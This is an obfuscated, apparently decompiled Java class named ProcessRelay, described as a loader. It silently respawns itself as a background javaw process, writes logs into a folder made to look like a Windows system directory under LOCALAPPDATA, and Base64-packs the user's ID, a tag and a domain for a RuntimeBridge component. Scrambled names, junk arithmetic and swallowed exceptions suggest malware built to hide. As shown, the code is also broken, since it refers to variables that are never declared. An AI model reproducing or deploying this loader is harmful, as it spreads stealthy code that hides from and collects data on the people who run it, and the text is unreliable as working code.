package net.efn.loader;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

public class ProcessRelay {
   public static void main(String[] args) {
      if (PsEO_KNMt_KSDG_NuYI.length > 0) {
         String var10000 = PsEO_KNMt_KSDG_NuYI[0];
         if (!var10000.equals("-restarted")) {
            RuntimeBridge.main(PsEO_KNMt_KSDG_NuYI);
            return;
         }
      }

      for (String cAvg : PsEO_KNMt_KSDG_NuYI) {
         StringBuilder var9 = new StringBuilder();
         if (cAvg.equals("-restarted")) {
            run();
            return;
         }
      }

      try {
         String ddzqbd_hlnly = System.getProperty("java.home");
         String[] var10001 = new String[]{"bin", null};
         StringBuilder var13 = new StringBuilder();
         var10001[1] = "javaw.exe";
         Path ociq_qb = Path.of(ddzqbd_hlnly, var10001);
         if (!Files.exists(ociq_qb)) {
            var10001 = new String[]{"bin", null};
            StringBuilder var15 = new StringBuilder();
            var10001[1] = "java.exe";
            ociq_qb = Path.of(ddzqbd_hlnly, var10001);
         }

         String QQzW_LOEB_rHSa_IiXu = new File(ProcessRelay.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
         StringBuilder var17 = new StringBuilder();
         String var33 = System.getenv("LOCALAPPDATA");
         var10001 = new String[3];
         StringBuilder var19 = new StringBuilder();
         var10001[0] = "Microsoft";
         var10001[1] = "Windows";
         StringBuilder var23 = new StringBuilder();
         var10001[2] = "NtProfileIndex";
         Path ULYxlsyTnP = Path.of(var33, var10001);
         Files.createDirectories(ULYxlsyTnP);
         String fue_emopx = ProcessRelay.class.getName();
         String[] var10002 = new String[]{ociq_qb.toString(), "-cp", QQzW_LOEB_rHSa_IiXu, fue_emopx, null};
         StringBuilder var25 = new StringBuilder();
         var10002[4] = "-restarted";
         ProcessBuilder piOvvmv = new ProcessBuilder(var10002);
         piOvvmv.redirectInput(Redirect.from(new File("NUL")));
         StringBuilder var27 = new StringBuilder();
         piOvvmv.redirectOutput(Redirect.appendTo(ULYxlsyTnP.resolve("_spawn.log").toFile()));
         piOvvmv.redirectErrorStream(true);
         piOvvmv.directory(ULYxlsyTnP.toFile());
         piOvvmv.start();
      } catch (Exception var28) {
      }
   }

   private static void run() {
      RuntimeBridge name1 = new RuntimeBridge();
      String ucuxp_gngxgq_zymger = name1.getDomain();
      String hT2tO = RuntimeBridge.fgqnpyible();
      String cz_wiur_tfg_owmb = RuntimeBridge.emitMuxd();
      String var10000 = tdzjejnUpxg(hT2tO);
      String var10001 = tdzjejnUpxg(cz_wiur_tfg_owmb);
      String var8 = tdzjejnUpxg(ucuxp_gngxgq_zymger);
      String var7 = var10001;
      String var6 = var10000;
      StringBuilder var9;
      StringBuilder var16 = var9 = new StringBuilder();
      StringBuilder var17 = var16.append("-restarted{\"userId\":\"").append(var6);
      StringBuilder var11 = new StringBuilder();
      StringBuilder var18 = var17.append("\",\"tag\":\"").append(var7);
      StringBuilder var13 = new StringBuilder();
      StringBuilder var19 = var18.append("\",\"domain\":\"").append(var8);
      StringBuilder var15 = new StringBuilder();
      String lenMin = var19.append("\",\"env\":\"DoubleClick\"}").toString();
      String nyaCw9 = Base64.getEncoder().encodeToString(lenMin.getBytes(StandardCharsets.UTF_8));
      RuntimeBridge.main(new String[]{nyaCw9});
   }

   private static String tdzjejnUpxg(String s) {
      if (jkuVdZnocx == null) {
         return "";
      } else {
         StringBuilder znrqqXpigug = new StringBuilder();

         for (char xzmgHmlyBsrzdxUf : jkuVdZnocx.toCharArray()) {
            switch (xzmgHmlyBsrzdxUf) {
               case '\t':
                  break;
               case '\n':
                  break;
               case '\r':
                  if (7902584355968426001L == 7902584355968426001L) {
                     int var9 = -546536129;
                     var9 ^= -1709451020;
                     long var10 = -35400400L;
                     var10 *= 5L;
                     var10 ^= 1174385480L;
                  }
                  break;
               case '"':
                  break;
               case '\\':
                  StringBuilder var6 = new StringBuilder();
                  break;
               default:
                  if (xzmgHmlyBsrzdxUf < ' ') {
                     StringBuilder var8 = new StringBuilder();
                     znrqqXpigug.append(String.format("\\u%04x", Integer.valueOf(xzmgHmlyBsrzdxUf)));
                  } else {
                     znrqqXpigug.append(xzmgHmlyBsrzdxUf);
                  }
            }
         }

         return znrqqXpigug.toString();
      }
   }
}
